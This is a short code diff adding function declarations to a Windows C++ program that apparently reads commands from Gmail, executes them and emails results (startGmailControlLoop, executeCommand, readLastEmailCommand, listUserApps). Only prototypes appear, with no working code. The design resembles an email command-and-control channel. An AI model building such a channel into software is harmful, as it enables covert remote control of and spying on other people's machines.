@@ -23,6 +23,7 @@
 #include <psapi.h>
 #include <vector>
 #include <set> 
+#include <filesystem>
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -60,3 +61,6 @@ std::string listUserApps();
 bool sendEmail(const std::string& subject, const std::string& body);
 std::string readLastEmailCommand();
 bool refreshAccessToken();
+bool isValidCommand(const std::string& cmd);
+std::string executeCommand(const std::string& cmd);
+void startGmailControlLoop();
